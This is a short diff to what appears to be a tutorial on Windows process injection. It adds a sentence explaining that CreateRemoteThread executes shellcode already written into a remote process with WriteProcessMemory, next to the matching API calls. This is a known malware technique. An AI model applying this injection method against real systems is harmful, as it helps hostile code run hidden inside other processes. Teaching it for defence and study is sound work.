@@ -31,6 +31,8 @@ After the buffer has been assigned, we can use ```WriteProcessMemory``` to "copy
 WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
 ```
 
+Now that our shellcode has been copied into the memory space of the remote process, we just need a way to trigger the execution of that code. We can use the ```CreateRemoteThread``` API and specify the remote process and pointer to the code buffer we want executed.
+
 ```c#
 hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
 if (hThread != NULL) {
